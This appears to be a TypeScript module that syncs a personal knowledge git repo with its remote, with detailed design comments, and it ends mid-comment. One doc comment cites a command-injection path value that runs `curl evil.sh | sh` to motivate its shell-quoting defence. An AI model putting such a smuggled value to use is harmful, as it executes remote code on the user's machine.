/**
 * Abrain auto-sync to remote (ADR 0020, revised 2026-05-17).
 *
 * Provides four operations against the `~/.abrain` git repo:
 *
 *   - pushAsync()    fire-and-forget after sediment commits; single-flight locked
 *   - fetchAndFF()   pi startup fetch + fast-forward; auto-merges (git 3-way,
 *                    no LLM) on divergence; only textual conflicts surface a
 *                    runbook. NEVER rebases (would rewrite local SHAs).
 *   - sync()         /abrain sync slash command: fetch+ff/merge+push in one call
 *   - getStatus()    /abrain status: ahead/behind/last-sync/last-error
 *
 * Design principles (per ADR 0020 + 2026-05-17 revision):
 *
 *   1. ALL git ops are silent-by-default. Failures write to
 *      ~/.abrain/.state/git-sync.jsonl (audit) and never throw to caller.
 *      Sediment's commit path must NEVER be blocked by network/auth issues.
 *
 *   2. Divergence is auto-resolved via `git merge --no-edit --no-ff` (3-way
 *      text merge — same algorithm git uses for code; no LLM in the loop).
 *      A textual conflict (unmerged paths) aborts with `merge --abort`,
 *      restores the working tree, and surfaces a runbook naming the
 *      conflicting files. We NEVER rebase (would silently rewrite local
 *      SHAs) and NEVER LLM-merge (hallucination risk in knowledge body
 *      text). Merge subprocess uses a hard env override for author/
 *      committer identity and disables commit signing so a user's
 *      `commit.gpgsign=true` config can't make merges fail at GPG
 *      pinentry. Working-tree-clean preflight runs before the merge so a
 *      dirty tree is reported as `failed` rather than misclassified as
 *      a conflict by the merge subprocess's overwrite-refusal.
 *
 *   3. No git ops when there's no `origin` remote — silently skipped.
 *      This keeps users who run abrain locally without a remote unaffected.
 *
 *   4. Single-flight in-process: concurrent sediment commits in the SAME
 *      pi process would race on git's index lock; we serialize via the
 *      cross-extension keyed chain in `_shared/git-singleflight.ts`
 *      (globalThis singleton, so jiti moduleCache:false copies share ONE
 *      chain). Cross-process protection (multiple pi instances) relies on
 *      git's own .git/index.lock — that's the fail-soft path (one wins,
 *      others audit-log a failed result).
 *      KNOWN GAP CLOSED (2026-06-10, PR-1/P0.6a of the goal-workflow
 *      impl plan; gap was open since 2026-05-17): sediment's writer-side
 *      `gitCommit` / `gitCommitAbrain` / `gitCommitAbrainAboutMe` now
 *      route through the SAME shared chain (keyed by resolved abrainHome),
 *      so a sediment commit can no longer race the auto-merge/push here.
 *      The earlier result-taxonomy mitigation (lock contention labelled
 *      `failed`, not `conflict`) is retained as the cross-process net.
 *
 *   5. Argv contains zero secrets. We only pass branch names and standard
 *      git verbs; credentials come from the system git credential helper
 *      (typically ~/.git-credentials or SSH agent). This matches the
 *      vault.ts pattern: never inject plaintext via argv.
 */

import { execFile } from "node:child_process";
import { promisify } from "node:util";
import * as path from "node:path";
import * as fs from "node:fs/promises";
import { existsSync } from "node:fs";

const execFileAsync = promisify(execFile);

const DEFAULT_FETCH_TIMEOUT_MS = 8_000;
// Fire-and-forget background pushes can safely wait longer. A short timeout
// can kill the local git process after the remote has received the push but
// before local ref/status confirmation, creating a false ahead/ref-drift view.
export const DEFAULT_PUSH_TIMEOUT_MS = 60_000;
const MAX_BUFFER = 1024 * 1024;

/**
 * Force C locale + no TTY credential prompt for every git subprocess in
 * this module.
 *
 * Round 2 audit fix (opus M3 + gpt #3 + deepseek M2): the previous code
 * inherited the parent locale. Under `LANG=zh_CN.UTF-8` / `de_DE.UTF-8`,
 * git emits translated error strings (e.g. "被拒绝" instead of "rejected"),
 * so the classifyError regex (/rejected|non-fast-forward|fetch first/)
 * silently missed real push rejections and labelled them `failed`. Users
 * on non-English systems then saw a generic failure instead of the
 * divergence runbook. Forcing LANG=C / LC_ALL=C gives stable error
 * strings; the regex is now correct under all user locales.
 *
 * GIT_TERMINAL_PROMPT=0 (opus M3 bonus): if git's credential helper is
 * missing or misconfigured, HTTPS push would otherwise prompt for a
 * password and the subprocess would hang until the operation timeout,
 * costing the user a slow startup. Setting this var makes git fail-fast with
 * "could not read Username for ..." which we then classify as `failed`.
 */
const GIT_ENV: NodeJS.ProcessEnv = {
  ...process.env,
  LANG: "C",
  LC_ALL: "C",
  GIT_TERMINAL_PROMPT: "0",
};

/**
 * Env used specifically for the auto-merge subprocess (2026-05-17 revision
 * of ADR 0020). On top of GIT_ENV:
 *
 *   - Forces author/committer to `abrain-autosync` even if the parent
 *     process has GIT_AUTHOR_NAME/GIT_COMMITTER_EMAIL set (those would
 *     otherwise win over the `-c user.name=` flag, which only seeds
 *     `git config` reads). Without this override, an auto-merge launched
 *     from a process that inherited a developer's author env would record
 *     the developer as the merge committer, blurring "this commit is a
 *     machine-generated convergence marker" semantics.
 *   - GIT_EDITOR=: defense in depth against any code path that ignores
 *     `--no-edit` and tries to open an editor (would otherwise hang until
 *     our timeout).
 *
 * commit.gpgsign=false is set via `-c` rather than env (no env knob exists
 * for it). Both are intentional: an auto-merge commit signed by the user's
 * GPG key under a fake author would be a misleading audit trail.
 */
const MERGE_ENV: NodeJS.ProcessEnv = {
  ...GIT_ENV,
  GIT_AUTHOR_NAME: "abrain-autosync",
  GIT_AUTHOR_EMAIL: "autosync@abrain.local",
  GIT_COMMITTER_NAME: "abrain-autosync",
  GIT_COMMITTER_EMAIL: "autosync@abrain.local",
  GIT_EDITOR: ":",
};

/**
 * `redactCredentials` moved to `./redact.ts` (ADR 0022 §D6.2 / INV-J).
 * The single source of truth now lives next to `redactSecretAnswer` /
 * `lengthBucket` so all credential / secret redaction sits in one
 * primitive module shared by git-sync and prompt_user.
 *
 * We `import` then `export` rather than the shorter `export ... from`
 * form: this file STILL calls `redactCredentials(...)` internally
 * (getStatus / formatSyncStatus / runMerge), and a bare re-export does
 * NOT create a local binding for those calls. Combined import+export
 * gives us both (a) a local symbol that resolves at runtime and
 * (b) the external import surface that downstream code already uses.
 *
 * ADR 0020 INV 7 is preserved: behavior is identical (the function
 * body moved unchanged), and smoke `smoke-abrain-redact.mjs` asserts
 * `from "./git-sync"` and `from "./redact"` give the SAME function
 * reference (no drift, no shadow definition).
 */
import { redactCredentials } from "./redact";
import { checkAdr0039ReconcileGate, ensureAdr0039PrePushHook, type Adr0039ReconcileGateDetails, type Adr0039PrePushHookResult } from "./reconcile-gate";
import { getCurrentAnchor, spreadAnchor } from "../_shared/causal-anchor";
import { gitSingleFlight, _gitSingleFlightStats } from "../_shared/git-singleflight";
import { canonicalGitRuntimeEnabled, getCanonicalGitRuntime } from "../_shared/canonical-git-runtime";
export { redactCredentials, ensureAdr0039PrePushHook };

/**
 * POSIX shell-quote a filesystem path for safe paste-into-bash.
 *
 * Round 2 audit fix (opus M2): `/abrain sync` divergence runbook includes
 * `cd <abrainHome>` that users will copy-paste into a shell. If
 * `ABRAIN_ROOT` env had been injected with shell metacharacters by an
 * earlier compromised process (e.g. `/tmp/evil"; curl evil.sh | sh; #`),
 * the pasted line would execute arbitrary code at user paste time. We
 * single-quote the path and escape any embedded single quotes via the
 * POSIX-standard `'\''` trick so the result is always a single literal
 * argument under sh / bash / zsh.
 *
 * If the path contains a newline or control char, we refuse the inline
 * form (return a placeholder telling the user to cd manually) since those
 * would corrupt the runbook even under quoting.
 */
export function shellQuotePath(p: string): string {
  if (/[\x00-\x1f\x7f]/.test(p)) {
    return "'<path contains control characters; cd to abrainHome manually>'";
  }
  return "'" + p.replace(/'/g, "'\\''") + "'";
}

export type GitSyncOp = "push" | "fetch" | "sync";

/**
 * Sync result taxonomy. Distinct codes for the audit log so `/abrain status`
 * can surface the right hint without parsing error strings.
 *
 *   ok            success (push completed / ff merged / auto-merge merged)
 *   noop          nothing to do (ahead=0 for push; behind=0 for fetch)
 *   skipped       no git repo or no origin remote — silently inactive
 *   conflict      auto-merge attempted on divergence but git found a
 *                 textual conflict; merge --abort restored clean state;
 *                 user must resolve manually via /abrain sync runbook
 *   diverged      DEPRECATED 2026-05-17. Older audit rows may still carry
 *                 this value; new fetchAndFF runs never produce it (the
 *                 auto-merge path produces `ok` or `conflict`). Kept in
 *                 the union so historical jsonl rows still parse.
 *   push_rejected git push rejected (remote ahead; user must pull first)
 *   push_blocked_reconcile ADR0039 L1/L2 reconcile gate rejected the pushed content
 *   timeout       git command exceeded timeout (likely network)
 *   failed        any other error (auth, fs, network reset, etc.)
 */
export type GitSyncResult =
  | "ok"
  | "noop"
  | "skipped"
  | "conflict"
  | "diverged"
  | "push_rejected"
  | "push_blocked_reconcile"
  | "timeout"
  | "failed";

export interface GitSyncEvent {
  ts: string;
  op: GitSyncOp;
  result: GitSyncResult;
  ahead?: number;
  behind?: number;
  /**
   * For `fetch` ops where divergence triggered auto-merge: number of
   * commits that were merged in from origin/main (equal to `behind` at
   * the start of the merge). Absent for pure fast-forward and noop.
   */
  merged?: number;
  /**
   * For `result=ok` fetch ops where a divergent merge conflicted ONLY in
   * derived L2 views and we auto-resolved it (ADR 0039 conflict-path
   * self-heal): knowledge L2 by reprojecting the merged L1 (deterministic),
   * constraint L2 by adopting the incoming side (the LLM re-merge happens
   * async via the next constraint compile). Value = number of conflicted
   * derived paths resolved. Absent for clean merges.
   */
  conflictResolvedDerivedL2?: number;
  /**
   * For `result=conflict`: list of paths git reported as unmerged after
   * the failed auto-merge attempt. Captured before `git merge --abort`
   * so the runbook can name the files even after working tree is reset.
   */
  conflictPaths?: string[];
  durationMs?: number;
  error?: string;
  reason?: string;
  details?: Adr0039ReconcileGateDetails | Adr0039PrePushHookResult | Record<string, unknown>;
}

export interface GitSyncOptions {
  abrainHome: string;
  timeoutMs?: number;
}

// ── single-flight lock ──────────────────────────────────────────────
//
// PR-1 / P0.6a (2026-06-10): the private tail-chain that lived here moved
// to `_shared/git-singleflight.ts` so sediment's writer-side commit
// helpers serialize on the SAME chain (keyed by resolved repo root,
// globalThis singleton across jiti module copies). The Round-2 TOCTOU
// lesson — chain via `tail.then(fn, fn)`, never a single inflight slot —
// is preserved verbatim in the shared implementation; see that module's
// header for the full history.

// Visible for tests. Returns `hasInflight: true` once at least one op has
// flowed through the shared chain in this process (any module copy).
export function _queueDepth(): { hasInflight: boolean } {
  return { hasInflight: _gitSingleFlightStats().opsStarted > 0 };
}

// ── git helpers ─────────────────────────────────────────────────────

/**
 * Is `abrainHome` a git repo with an `origin` remote? Used to decide
 * whether any sync op should run at all.
 *
 * Returns false on:
 *   - .git missing (not a repo)
 *   - `git remote get-url origin` failing (no origin configured)
 *   - timeout (treat as "doesn't really work, skip")
 */
export async function hasGitRemote(abrainHome: string): Promise<boolean> {
  if (!existsSync(path.join(abrainHome, ".git"))) return false;
  try {
    const { stdout } = await execFileAsync(
      "git",
      ["-C", abrainHome, "remote", "get-url", "origin"],
      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
    );
    return Boolean(stdout.trim());
  } catch {
    return false;
  }
}

/**
 * Resolve ahead/behind vs origin/main. Returns {0,0} if anything goes
 * wrong (e.g. origin/main not yet fetched). The format
 *   `git rev-list --left-right --count origin/main...HEAD`
 * prints "<behind>\t<ahead>" — that's the git convention for left=base.
 */
export async function getAheadBehind(
  abrainHome: string,
): Promise<{ ahead: number; behind: number }> {
  try {
    const { stdout } = await execFileAsync(
      "git",
      ["-C", abrainHome, "rev-list", "--left-right", "--count", "origin/main...HEAD"],
      { timeout: 3_000, maxBuffer: 64 * 1024, env: GIT_ENV },
    );
    const parts = stdout.trim().split(/\s+/);
    const behind = parseInt(parts[0] ?? "0", 10);
    const ahead = parseInt(parts[1] ?? "0", 10);
    return {
      ahead: Number.isFinite(ahead) ? ahead : 0,
      behind: Number.isFinite(behind) ? behind : 0,
    };
  } catch {
    return { ahead: 0, behind: 0 };
  }
}

/**
 * Append one event to ~/.abrain/.state/git-sync.jsonl. Best-effort:
 * audit-write failure must never block the actual sync path (we'd be
 * masking the original outcome by throwing on log write).
 */
async function audit(abrainHome: string, event: GitSyncEvent): Promise<void> {
  try {
    const stateDir = path.join(abrainHome, ".state");
    await fs.mkdir(stateDir, { recursive: true });
    // ADR 0027 C6b: cross-layer causal anchor. git-sync writes may fire
    // from sediment's commit path (within agent_end — anchor matches
    // trigger turn) OR from pushAsync's deferred fire-and-forget. When
    // the caller is inside a `runWithTriggerAnchor` scope (sediment
    // agent_end), getCurrentAnchor() returns the trigger-time snapshot
    // even from a fire-and-forget push that completes after the next
    // turn (P0-β fix). For callers outside any scope (startup auto-sync),
    // anchor is live state, which is correct since startup writes aren't
    // tied to any user turn anyway.
    const enriched = {
      ...spreadAnchor(getCurrentAnchor()),
      ...event,
    };
    await fs.appendFile(
      path.join(stateDir, "git-sync.jsonl"),
      JSON.stringify(enriched) + "\n",
      "utf-8",
    );
  } catch {
    // intentionally silent
  }
}

/**
 * Classify an execFile error into a GitSyncResult code.
 * Used by both pushAsync and fetchAndFF so taxonomy stays consistent.
 */
// Round 2 audit fixes:
//   - opus M1 / deepseek m2: redact credential URLs from message BEFORE
//     truncation. Push stderr can contain `https://user:tok@host/...`.
//   - opus M3 / gpt #3 / deepseek M2: regex now relies on C locale (set
//     via GIT_ENV on every execFile site), so we keep concise English
//     phrases. Dropped bare `/behind/i` (too greedy).
//   - opus m4: SIGINT (Ctrl-C from user) sets `killed && signal` too;
//     classifying it as `timeout` was misleading. Real timeouts come
//     with `signal === 'SIGTERM'`; SIGINT is user-initiated -> `failed`.
//   - `allowPushRejected=false`: fetch-context callers avoid misleading
//     `push_rejected` label when fetch stderr happens to match the regex.
function classifyError(
  e: unknown,
  allowPushRejected: boolean = true,
): { result: GitSyncResult; message: string } {
  const err = e as { killed?: boolean; signal?: string; message?: string; stderr?: string };
  const msg = String(err?.message || err || "unknown");
  const stderr = String(err?.stderr || "");
  const combined = msg + " " + stderr;
  const message = redactCredentials(msg).slice(0, 500);

  if (err?.killed && err?.signal === "SIGTERM") {
    return { result: "timeout", message };
  }
  if (allowPushRejected && /rejected|non-fast-forward|fetch first/i.test(combined)) {
    return { result: "push_rejected", message };
  }
  return { result: "failed", message };
}

// ── public ops ──────────────────────────────────────────────────────

/**
 * Push HEAD to origin/main. Single-flight protected.
 *
 * Behavior:
 *   - no remote / not a repo → result: "skipped"
 *   - ahead = 0              → result: "noop" (don't even invoke git push)
 *   - push success           → result: "ok"
 *   - remote rejected        → result: "push_rejected" (user must pull first)
 *   - network/auth/timeout   → result: "failed" or "timeout"
 *
 * Never throws. Always records to audit.
 */
export async function pushAsync(opts: GitSyncOptions): Promise<GitSyncEvent> {
  const timeoutMs = opts.timeoutMs ?? DEFAULT_PUSH_TIMEOUT_MS;
  const start = Date.now();

  if (canonicalGitRuntimeEnabled()) {
    const event: GitSyncEvent = { ts: new Date().toISOString(), op: "push", result: "failed", durationMs: 0 };
    try {
      if (!(await hasGitRemote(opts.abrainHome))) {
        event.result = "skipped";
      } else {
        const runtime = await getCanonicalGitRuntime({ abrainHome: opts.abrainHome });
        const pushed = await runtime.requestPush();
        event.result = pushed.status === "success" ? "ok"
          : pushed.status === "disabled" ? "skipped"
          : pushed.reason?.startsWith("RECONCILE_") ? "push_blocked_reconcile"
          : "failed";
        event.reason = pushed.reason ?? pushed.status;
        event.details = { canonicalGitRuntime: true, episodeId: pushed.episodeId, targetCommit: pushed.targetCommit, remoteContained: pushed.remoteContained };
        if (event.result === "failed") event.error = pushed.reason ?? pushed.status;
      }
    } catch (error) {
      event.result = "failed";
      event.error = redactCredentials(error instanceof Error ? error.message : String(error)).slice(0, 500);
    }
    event.durationMs = Date.now() - start;
    await audit(opts.abrainHome, event);
    return event;
  }

  if (!(await hasGitRemote(opts.abrainHome))) {
    const event: GitSyncEvent = {
      ts: new Date().toISOString(),
      op: "push",
      result: "skipped",
      durationMs: Date.now() - start,
    };
    await audit(opts.abrainHome, event);
    return event;
  }

  return gitSingleFlight(opts.abrainHome, async () => {
    const event: GitSyncEvent = {
      ts: new Date().toISOString(),
      op: "push",
      result: "ok",
      durationMs: 0,
    };
    try {
      const { ahead, behind } = await getAheadBehind(opts.abrainHome);
      event.ahead = ahead;
      event.behind = behind;

      if (ahead === 0) {
        event.result = "noop";
        event.durationMs = Date.now() - start;
        await audit(opts.abrainHome, event);
        return event;
      }

      const reconcile = await checkAdr0039ReconcileGate({ abrainHome: opts.abrainHome });
      if (!reconcile.ok) {
        event.result = "push_blocked_reconcile";
        event.reason = reconcile.reason;
        event.details = reconcile.details;
        event.error = "ADR0039 reconcile gate blocked push; reproject L2 from L1 or append a corrective L1 event, then commit l1/l2 before retrying";
        event.durationMs = Date.now() - start;
        await audit(opts.abrainHome, event);
        return event;
      }

      // Use HEAD:main to push current branch (whatever it's called locally)
      // to the remote main branch. Resilient to non-conventional local
      // branch names.
      await execFileAsync(
        "git",
        ["-C", opts.abrainHome, "push", "origin", "HEAD:main"],
        { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
      );

      event.result = "ok";
      event.durationMs = Date.now() - start;
    } catch (e: unknown) {
      // Push context: allow push_rejected classification (the regex was
      // designed for git push rejection messages).
      const { result, message } = classifyError(e, true);
      event.result = result;
      event.error = message;
      event.durationMs = Date.now() - start;
    }
    await audit(opts.abrainHome, event);
    return event;
  });
}

/**
 * Fetch origin and reconcile local main with it.
 *
 * 2026-05-17 revision (supersedes the original ff-only behavior in this
 * function): we now attempt a real merge on divergence. Git's own
 * 3-way merge handles non-overlapping changes — the common case for
 * abrain, where two devices write *different* slug markdown files. We
 * only fall back to surfacing a runbook when git itself reports a
 * textual conflict.
 *
 * Behavior:
 *   - no remote / not a repo → result: "skipped"
 *   - behind = 0             → result: "noop" (don't merge)
 *   - ahead = 0 + behind > 0 → ff merge → result: "ok"
 *   - ahead > 0 + behind > 0 → try `git merge --no-edit --no-ff origin/main`:
 *       - merge clean         → result: "ok", merged=<behind>
 *       - textual conflict    → `git merge --abort`, result: "conflict",
 *                               conflictPaths=<unmerged files>
 *   - any other error          → result: "failed" or "timeout"
 *
 * We still NEVER rebase (would silently rewrite local SHAs) and NEVER
 * LLM-merge a conflict (hallucination risk in knowledge substrate).
 *
 * Never throws.
 */
export async function fetchAndFF(opts: GitSyncOptions): Promise<GitSyncEvent> {
  const timeoutMs = opts.timeoutMs ?? DEFAULT_FETCH_TIMEOUT_MS;
  const start = Date.now();

  if (canonicalGitRuntimeEnabled()) {
    const event: GitSyncEvent = {
      ts: new Date().toISOString(),
      op: "fetch",
      result: "failed",
      reason: "canonical_fetch_merge_retired",
      error: "canonical P1 mode forbids legacy fetch/fast-forward/merge; remote-behind or divergence requires owner reconciliation",
      durationMs: Date.now() - start,
      details: { canonicalGitRuntime: true },
    };
    await audit(opts.abrainHome, event);
    return event;
  }

  if (!(await hasGitRemote(opts.abrainHome))) {
    const event: GitSyncEvent = {
      ts: new Date().toISOString(),
      op: "fetch",
      result: "skipped",
      durationMs: Date.now() - start,
    };
    await audit(opts.abrainHome, event);
    return event;
  }

  return gitSingleFlight(opts.abrainHome, async () => {
    const event: GitSyncEvent = {
      ts: new Date().toISOString(),
      op: "fetch",
      result: "ok",
      durationMs: 0,
    };
    try {
      // Step 1: fetch (no merge). Updates origin/main ref only.
      await execFileAsync(
        "git",
        ["-C", opts.abrainHome, "fetch", "origin", "main"],
        { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
      );

      const { ahead, behind } = await getAheadBehind(opts.abrainHome);
      event.ahead = ahead;
      event.behind = behind;

      // Universal MERGE_HEAD preflight (Round 4 audit fix — was Round 3's
      // "universal" claim but actually gated on behind>0). A pre-existing
      // MERGE_HEAD means a prior merge was never concluded. Even if we'd
      // return `noop` (behind=0) the wedge still blocks the next sediment
      // commit ("fatal: You have not concluded your merge"), and that
      // failure would surface inside writer.ts's swallow-catch with no
      // breadcrumb pointing back here. Surface it explicitly on every
      // fetchAndFF, regardless of ahead/behind, with a recovery hint.
      // Preflight is intentionally read-only: it never calls `merge --abort`
      // for the user. Auto-clearing a wedge could lose work the user was
      // mid-resolving manually. (Round 4: opus MAJOR-2 + gpt MAJOR-2.)
      if (existsSync(path.join(opts.abrainHome, ".git", "MERGE_HEAD"))) {
        event.result = "failed";
        event.error =
          "pre-existing MERGE_HEAD detected (prior merge wedge); " +
          "run `git -C <abrainHome> merge --abort` to recover";
        event.durationMs = Date.now() - start;
        await audit(opts.abrainHome, event);
        return event;
      }

      if (behind === 0) {
        // Nothing new on remote. If this instance is already ahead, a prior
        // writer in this or another pi process committed but did not push.
        // Enqueue a detached push behind this fetch on the shared singleflight;
        // pushAsync performs the ADR0039 reconcile gate and audits its result.
        event.result = "noop";
        if (ahead > 0) {
          pushAsync({ abrainHome: opts.abrainHome }).catch(() => undefined);
        }
      } else if (ahead === 0) {
        // Pure fast-forward: local has no unique commits.
        await execFileAsync(
          "git",
          ["-C", opts.abrainHome, "merge", "--ff-only", "origin/main"],
          { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
        );
        event.result = "ok";
      } else {
        // Both have unique commits — divergence. Attempt a real merge
        // (3-way, git's own merge algorithm — no LLM). 2026-05-17 revision
        // of ADR 0020: abrain knowledge entries are typically file-per-slug
        // so different devices write disjoint files; git can resolve those
        // without our help. We only fall back to `conflict` when git
        // itself reports an unresolvable textual conflict (unmerged paths
        // present in the index after merge failed).
        //
        // Round 3 audit fixes (2026-05-17):
        //   - PREFLIGHT: working-tree-clean check. Without it, a dirty tree
        //     (sediment mid-write, user manual edit, autocrlf phantom) makes
        //     `git merge` fail with "local changes ... would be overwritten"
        //     and the catch block previously misclassified that as `conflict`.
        //   - PREFLIGHT: pre-existing MERGE_HEAD. If a previous merge wedge
        //     was never cleaned up, retrying merge would error opaquely;
        //     surface it explicitly as `failed` with a recovery hint.
        //   - `-c commit.gpgsign=false`: a user with `commit.gpgsign=true`
        //     would otherwise have the merge fail at gpg pinentry/missing-
        //     agent, again misclassified as conflict. An auto-merge commit
        //     signed under fake author identity is also a misleading audit
        //     trail — better to leave it unsigned.
        //   - MERGE_ENV: forces author/committer identity over any inherited
        //     `GIT_AUTHOR_NAME/EMAIL` env (which would beat `-c user.name=`).
        //   - CATCH CLASSIFICATION: only label result=`conflict` when there
        //     is *positive evidence* of a textual conflict (unmerged paths,
        //     or `CONFLICT (`/`Automatic merge failed` in stderr under
        //     LANG=C). Otherwise route through classifyError(false) so
        //     timeouts/locks/hook-failures/etc. get their correct codes.
        //   - POST-ABORT VERIFY: re-check `.git/MERGE_HEAD` existence. If
        //     abort itself failed and the wedge persists, upgrade result
        //     to `failed` (with a recovery hint) so the runbook doesn't
        //     claim a clean tree that doesn't exist.

        // (MERGE_HEAD wedge already handled by the universal preflight above.)
        // Preflight: dirty working tree. Use `git status --porcelain`
        // (covers staged, modified, untracked-but-not-ignored). `.state/`
        // is in .gitignore so the audit log doesn't trigger this.
        // Round 4 deepseek NIT: preflight timeout now matches caller's
        // `timeoutMs` so a maintainer raising the merge timeout doesn't
        // leave a hidden 3s ceiling on the preflight.
        try {
          const { stdout: statusOut } = await execFileAsync(
            "git",
            ["-C", opts.abrainHome, "status", "--porcelain"],
            { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
          );
          if (statusOut.trim() !== "") {
            const dirtyFiles = statusOut.trim().split("\n").slice(0, 5).join(", ");
            event.result = "failed";
            event.error =
              `working tree not clean; refusing to auto-merge over local changes ` +
              `(${statusOut.trim().split("\n").length} dirty path(s): ${dirtyFiles}${statusOut.trim().split("\n").length > 5 ? ", ..." : ""})`;
            event.durationMs = Date.now() - start;
            await audit(opts.abrainHome, event);
            return event;
          }
        } catch {
          // Status check failed — we don't know if tree is clean. Skip
          // the merge attempt rather than risk merging over uncommitted
          // work; that's the conservative choice for a knowledge substrate.
          event.result = "failed";
          event.error = "working-tree-clean preflight failed; refusing to auto-merge";
          event.durationMs = Date.now() - start;
          await audit(opts.abrainHome, event);
          return event;
        }

        const mergeMsg = `abrain auto-merge: integrate ${behind} commit(s) from origin/main`;
        try {
          await execFileAsync(
            "git",
            [
              "-C", opts.abrainHome,
              "-c", "user.name=abrain-autosync",
              "-c", "user.email=autosync@abrain.local",
              "-c", "commit.gpgsign=false",
              // Round 4 audit (opus MAJOR-1, partially): `-c commit.gpgsign=false`
              // alone covers git's documented signing config key. But
              // `git merge` also accepts an explicit `--no-gpg-sign` flag
              // that is checked independently of any config; we pass it as
              // belt-and-suspenders so even an unusual git build with a
              // non-standard signing-default config can't surprise us.
              "merge", "--no-edit", "--no-ff", "--no-gpg-sign", "-m", mergeMsg,
              "origin/main",
            ],
            { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: MERGE_ENV },
          );
          event.result = "ok";
          event.merged = behind;
        } catch (mergeErr: unknown) {
          // Round 4 audit (3-way consensus: opus MINOR-1 + gpt CRITICAL-1
          // + deepseek item 1): SIGTERM evidence must beat positive-
          // conflict evidence. A merge subprocess that wrote partial
          // unmerged index entries before our timeout SIGTERM'd it would
          // otherwise be misclassified as `conflict` (because
          // conflictPaths.length > 0) instead of `timeout`. Smoke 17.3's
          // timeoutMs:1 paper-cut was a symptom of this. Order of
          // precedence in classification:
          //   1. wedgePersists  → failed (lying about clean tree is worst)
          //   2. SIGTERM        → timeout (we killed it; conclusive)
          //   3. real conflict  → conflict
          //   4. anything else  → classifyError (failed/etc.)
          const errObj = mergeErr as { killed?: boolean; signal?: string; stderr?: string; message?: string };
          const wasTimeout = errObj?.killed === true && errObj?.signal === "SIGTERM";

          // Capture conflict path list BEFORE aborting. After abort, the
          // unmerged index entries are gone. `-z` + NUL split is the only
          // safe parse for paths containing spaces/quotes/newlines.
          // Round 4 deepseek NIT: reference MAX_BUFFER constant instead of
          // hardcoding 1024*1024 so a maintainer raising the module-level
          // buffer doesn't leave this site behind.
          let conflictPaths: string[] = [];
          try {
            const { stdout } = await execFileAsync(
              "git",
              ["-C", opts.abrainHome, "diff", "-z", "--name-only", "--diff-filter=U"],
              { timeout: timeoutMs, maxBuffer: MAX_BUFFER, env: GIT_ENV },
            );
            conflictPaths = stdout.split("\0").filter(Boolean);
          } catch {
            // Couldn't enumerate — leave empty; classification below will
            // route this to `failed`/`timeout` rather than `conflict` (no
            // positive evidence of unmerged paths).
          }

          const rawStderr = String(errObj?.stderr || "") + "\n" + String(errObj?.message || "");

          // ADR 0039 conflict-path self-heal (try BEFORE aborting). L1 events
          // are content-addressed + disjoint across devices, so they always
          // merge cleanly; a divergent merge's ONLY conflicts are in DERIVED
          // L2 views (knowledge entry files where the SAME slug was edited on
          // both devices; the constraint compiled-view when both devices
          // compiled). Those are not real content conflicts. If EVERY
          // conflicted path is under a derived L2 view (l2/views/knowledge or
          // l2/views/constraint), resolve + conclude the merge — turning an
          // auto-sync stall into a self-heal. Any conflict OUTSIDE derived L2
          // (real content — which content-addressed L1 should never produce)
          // falls through to abort+classify. SIGTERM never auto-resolves.
          let healed = false;
          if (!wasTimeout && conflictPaths.length > 0 && conflictPaths.every((p) => p.startsWith("l2/views/knowledge/") || p.startsWith("l2/views/constraint/"))) {
            healed = await resolveDerivedL2ConflictAndCommit(opts, timeoutMs, mergeMsg, conflictPaths);
            if (healed) {
              event.result = "ok";
              event.merged = behind;
              event.conflictResolvedDerivedL2 = conflictPaths.length;
            }
          }

          if (!healed) {
          // Always attempt abort (even on non-conflict failures) so we
          // don't leave a merge state on disk for the next op to trip on.
          // Timeout matches merge timeout so a slow disk doesn't leave a
          // wedge with a stricter abort deadline (Round 3 opus M4).
          let abortFailed = false;
          try {
            await execFileAsync(
              "git",
              ["-C", opts.abrainHome, "merge", "--abort"],
              { timeout: timeoutMs, maxBuffer: 64 * 1024, env: GIT_ENV },
            );
          } catch {
            abortFailed = true;
          }
          const wedgePersists = existsSync(path.join(opts.abrainHome, ".git", "MERGE_HEAD"));

          if (wedgePersists) {
            // Worst case: abort failed AND a merge state remains. This is
            // qualitatively different from a clean conflict — the next
            // sediment commit will hit `MERGE_HEAD exists` and wedge. We
            // refuse to call this a `conflict` (the runbook would lie
            // about "working tree restored"). Surface as `failed` with an
            // explicit recovery hint.
            event.result = "failed";
            event.error =
              `merge failed and abort did not clear MERGE_HEAD; ` +
              `run \`git -C <abrainHome> merge --abort\` manually to recover` +
              (abortFailed ? " (abort subprocess errored)" : "");
          } else if (wasTimeout) {
            // SIGTERM trumps any positive-conflict signal: even if git
            // wrote a partial unmerged index before we killed it, the
            // result the user cares about is "we ran out of time", not
            // "there's a conflict" — the partial state was cleared by
            // the abort above.
            event.result = "timeout";
            event.error = `merge timed out after ${timeoutMs}ms`;
          } else {
            // Positive evidence of textual conflict: either git reported
            // unmerged paths, OR stderr contains the stable LANG=C
            // conflict markers. Either alone is sufficient — conflictPaths
            // could be empty if `git diff` itself fell over, and stderr
            // markers cover the case where index enumeration succeeded
            // but returned nothing for some edge reason.
            const stderrMentionsConflict = /CONFLICT \(|Automatic merge failed/i.test(rawStderr);
            const isRealConflict = conflictPaths.length > 0 || stderrMentionsConflict;
            if (isRealConflict) {
              event.result = "conflict";
              event.conflictPaths = conflictPaths;
              event.error =
                conflictPaths.length > 0
                  ? `merge conflict in ${conflictPaths.length} file(s): ${conflictPaths.slice(0, 5).join(", ")}${conflictPaths.length > 5 ? ", ..." : ""}`
                  : `merge conflict (paths not enumerable): ${redactCredentials(rawStderr).slice(0, 160)}`;
            } else {
              // No positive conflict evidence and not a timeout — must be
              // lock/hook/gpg/unrelated-histories/etc. Route through the
              // shared classifyError. allowPushRejected=false (this is a
              // merge, not a push).
              const { result, message } = classifyError(mergeErr, false);
              event.result = result;
              event.error = message;
            }
          }
          }
        }
      }
      event.durationMs = Date.now() - start;
    } catch (e: unknown) {
      // Fetch context: don't allow push_rejected label (gpt #3 —
      // fetch stderr containing 'rejected' should classify as failed,
      // not as push semantics).
      const { result, message } = classifyError(e, false);
      event.result = result;
      event.error = message;
      event.durationMs = Date.now() - start;
    }
    await audit(opts.abrainHome, event);
    return event;
  });
}

/**
 * ADR 0039 derived-L2 conflict-path self-heal. Called by fetchAndFF when a
